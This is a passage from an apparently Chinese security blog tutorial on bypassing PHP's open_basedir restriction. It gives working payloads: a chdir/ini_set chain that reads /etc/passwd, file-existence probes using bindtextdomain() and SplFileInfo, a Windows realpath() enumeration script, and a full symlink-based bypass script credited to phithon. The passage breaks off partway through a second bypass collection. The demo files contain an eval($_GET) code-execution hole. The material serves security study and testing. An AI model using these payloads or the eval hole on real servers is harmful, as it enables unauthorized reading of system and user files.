title="基本原理"></a>基本原理</h3><p>这种利用方式跟open_basedir存在缺陷的处理逻辑有关，具体原理可参考：</p><p><a href="https://www.jianshu.com/p/98535e6c54df" target="_blank" rel="noopener">《通过chdir来bypass open_basedir》</a></p><p><a href="https://www.4hou.com/web/17357.html" target="_blank" rel="noopener">《从PHP底层看open_basedir bypass》</a></p><h3 id="Bypass-2"><a href="#Bypass-2" class="headerlink" title="Bypass"></a>Bypass</h3><p>测试Demo，放置在Web根目录下，在执行输入参数的PHP代码前后获取open_basedir的值看是否改变了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'open_basedir: '</span>.ini_get(<span class="string">'open_basedir'</span>).<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'GET: '</span>.$_GET[<span class="string">'c'</span>].<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'open_basedir: '</span>.ini_get(<span class="string">'open_basedir'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入以下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'mi1k7ea'</span>);chdir(<span class="string">'mi1k7ea'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span> file_get_contents(<span class="string">'/etc/passwd'</span>);</span><br></pre></td></tr></table></figure><p>可以看到open_basedir被设置为’/‘了，整个失去了效果：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/7.png" alt=""></p><p>注意，如果php文件在Web根目录，则需要构造一个相对可上跳的open_basedir：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'mi1k7ea'</span>);</span><br><span class="line">chdir(<span class="string">'mi1k7ea'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br></pre></td></tr></table></figure><p>如果php文件直接在Web目录的子目录的话，就可不用创建相对可上跳的open_basedir了。</p><h2 id="0x06-利用bindtextdomain-函数Bypass"><a href="#0x06-利用bindtextdomain-函数Bypass" class="headerlink" title="0x06 利用bindtextdomain()函数Bypass"></a>0x06 利用bindtextdomain()函数Bypass</h2><h3 id="bindtextdomain-函数"><a href="#bindtextdomain-函数" class="headerlink" title="bindtextdomain()函数"></a>bindtextdomain()函数</h3><p>(PHP 4, PHP 5, PHP 7)</p><p>bindtextdomain()函数用于绑定domain到某个目录的函数。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindtextdomain ( string $domain , string $directory ) : string</span><br></pre></td></tr></table></figure><h3 id="Bypass-3"><a href="#Bypass-3" class="headerlink" title="Bypass"></a>Bypass</h3><p>利用原理是基于报错：bindtextdomain()函数的第二个参数\$directory是一个文件路径，它会在\$directory存在的时候返回\$directory，不存在则返回false。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$re = bindtextdomain(<span class="string">'xxx'</span>, $_GET[<span class="string">'dir'</span>]);</span><br><span class="line">var_dump($re);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功访问到存在的文件是会返回当前文件的路径的：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/8.png" alt=""></p><p>若访问的文件不存在则返回false：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/9.png" alt=""></p><p>可以看到，和前面几种方法相比，实在是相形见绌，只能应用于判断目标文件是否存在，有利于后续和其他漏洞进行组合利用。</p><h2 id="0x07-利用SplFileInfo-getRealPath-类方法Bypass"><a href="#0x07-利用SplFileInfo-getRealPath-类方法Bypass" class="headerlink" title="0x07 利用SplFileInfo::getRealPath()类方法Bypass"></a>0x07 利用SplFileInfo::getRealPath()类方法Bypass</h2><h3 id="SplFileInfo类"><a href="#SplFileInfo类" class="headerlink" title="SplFileInfo类"></a>SplFileInfo类</h3><p>(PHP 5 &gt;= 5.1.2, PHP 7)</p><p>SplFileInfo类为单个文件的信息提供高级面向对象的接口。</p><p><strong>SplFileInfo::getRealPath</strong></p><p>(PHP 5 &gt;= 5.2.2, PHP 7)</p><p>SplFileInfo::getRealPath类方法是用于获取文件的绝对路径。</p><h3 id="Bypass-4"><a href="#Bypass-4" class="headerlink" title="Bypass"></a>Bypass</h3><p>和bindtextdomain的原理一样，是基于报错的方式，返回结果都是一样的，就不再多演示，这里直接给出payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;b&gt;open_basedir: '</span> . ini_get(<span class="string">'open_basedir'</span>) . <span class="string">'&lt;/b&gt;&lt;br /&gt;'</span>;</span><br><span class="line">$info = <span class="keyword">new</span> SplFileInfo($_GET[<span class="string">'dir'</span>]);</span><br><span class="line">var_dump($info-&gt;getRealPath());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x08-利用realpath-函数Bypass"><a href="#0x08-利用realpath-函数Bypass" class="headerlink" title="0x08 利用realpath()函数Bypass"></a>0x08 利用realpath()函数Bypass</h2><h3 id="realpath-函数"><a href="#realpath-函数" class="headerlink" title="realpath()函数"></a>realpath()函数</h3><p>(PHP 4, PHP 5, PHP 7)</p><p>realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realpath ( string $path ) : string</span><br></pre></td></tr></table></figure><h3 id="Bypass-5"><a href="#Bypass-5" class="headerlink" title="Bypass"></a>Bypass</h3><p>环境条件：Windows</p><p>基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符&lt;和&gt;，不然只能进行暴破。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">set_error_handler(<span class="string">'isexists'</span>);</span><br><span class="line">$dir = <span class="string">'E:/wamp64/'</span>;</span><br><span class="line">$file = <span class="string">''</span>;</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($chars); $i++) &#123;</span><br><span class="line">        $file = $dir . $chars[$i] . <span class="string">'&lt;&gt;&lt;'</span>;</span><br><span class="line">        realpath($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span><span class="params">($errno, $errstr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">        preg_match($regexp, $errstr, $matches);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line">                printf(<span class="string">"%s &lt;br/&gt;"</span>, $matches[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/10.png" alt=""></p><h2 id="0x09-脚本合集"><a href="#0x09-脚本合集" class="headerlink" title="0x09 脚本合集"></a>0x09 脚本合集</h2><h3 id="p牛的脚本"><a href="#p牛的脚本" class="headerlink" title="p牛的脚本"></a>p牛的脚本</h3><p>脚本原理就是利用symlink()函数来Bypass的原理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* by phithon</span></span><br><span class="line"><span class="comment">* From https://www.leavesongs.com</span></span><br><span class="line"><span class="comment">* detail: http://cxsecurity.com/issue/WLB-2009110068</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">'content-type: text/plain'</span>);</span><br><span class="line">error_reporting(<span class="number">-1</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">printf(<span class="string">"open_basedir: %s\nphp_version: %s\n"</span>, ini_get(<span class="string">'open_basedir'</span>), phpversion());</span><br><span class="line">printf(<span class="string">"disable_functions: %s\n"</span>, ini_get(<span class="string">'disable_functions'</span>));</span><br><span class="line">$file = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, <span class="keyword">isset</span>($_REQUEST[<span class="string">'file'</span>]) ? $_REQUEST[<span class="string">'file'</span>] : <span class="string">'/etc/passwd'</span>);</span><br><span class="line">$relat_file = getRelativePath(<span class="keyword">__FILE__</span>, $file);</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $file);</span><br><span class="line">$name = mt_rand() % <span class="number">999</span>;</span><br><span class="line">$exp = getRandStr();</span><br><span class="line">mkdir($name);</span><br><span class="line">chdir($name);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span> ; $i &lt; count($paths) - <span class="number">1</span> ; $i++)&#123;</span><br><span class="line">    mkdir($paths[$i]);</span><br><span class="line">    chdir($paths[$i]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir($paths[$i]);</span><br><span class="line"><span class="keyword">for</span> ($i -= <span class="number">1</span>; $i &gt; <span class="number">0</span>; $i--) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $relat_file);</span><br><span class="line">$j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $paths[$i] == <span class="string">'..'</span>; $i++) &#123; </span><br><span class="line">    mkdir($name);</span><br><span class="line">    chdir($name);</span><br><span class="line">    $j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= $j; $i++) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j + <span class="number">1</span>, $name);</span><br><span class="line">symlink(implode(<span class="string">'/'</span>, $tmp), <span class="string">'tmplink'</span>);</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j, <span class="string">'..'</span>);</span><br><span class="line">symlink(<span class="string">'tmplink/'</span> . implode(<span class="string">'/'</span>, $tmp) . $file, $exp);</span><br><span class="line">unlink(<span class="string">'tmplink'</span>);</span><br><span class="line">mkdir(<span class="string">'tmplink'</span>);</span><br><span class="line">delfile($name);</span><br><span class="line">$exp = dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>]) . <span class="string">"/&#123;$exp&#125;"</span>;</span><br><span class="line">$exp = <span class="string">"http://&#123;$_SERVER['SERVER_NAME']&#125;&#123;$exp&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n-----------------content---------------\n\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($exp);</span><br><span class="line">delfile(<span class="string">'tmplink'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">  $from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">  $from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">  $to   = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $to);</span><br><span class="line"></span><br><span class="line">  $from   = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">  $to     = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">  $relPath  = $to;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span>($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line">    <span class="comment">// find first non-matching dir</span></span><br><span class="line">    <span class="keyword">if</span>($dir === $to[$depth]) &#123;</span><br><span class="line">      <span class="comment">// ignore this directory</span></span><br><span class="line">      array_shift($relPath);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">      $remaining = count($from) - $depth;</span><br><span class="line">      <span class="keyword">if</span>($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">        $padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">        $relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delfile</span><span class="params">($deldir)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (@is_file($deldir)) &#123;</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @unlink($deldir);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(@is_dir($deldir))&#123;</span><br><span class="line">        <span class="keyword">if</span>(($mydir = @opendir($deldir)) == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">false</span> !== ($file = @readdir($mydir)))</span><br><span class="line">        &#123;</span><br><span class="line">            $name = File_Str($deldir.<span class="string">'/'</span>.$file);</span><br><span class="line">            <span class="keyword">if</span>(($file!=<span class="string">'.'</span>) &amp;&amp; ($file!=<span class="string">'..'</span>))&#123;delfile($name);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir($mydir);</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @rmdir($deldir) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">File_Str</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'//'</span>,<span class="string">'/'</span>,str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,$string));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span><span class="params">($length = <span class="number">6</span>)</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $randStr = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randStr .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/11.png" alt=""></p><h3 id="网上的一个脚本"><a href="#网上的一个脚本" class="headerlink" title="网上的一个脚本"></a>网上的一个脚本</h3><p>原理是用glob://伪协议：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PHP open_basedir bypass collection</span></span><br><span class="line"><span class="comment">Works with &gt;= PHP5</span></span><br><span class="line"><span class="comment">By /fd, <span class="doctag">@filedescriptor</span>(https://twitter.com/filedescriptor)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant functions</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line"><span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">$from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">$from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">$to = str_replace(<span class="string">'\\'</span>, 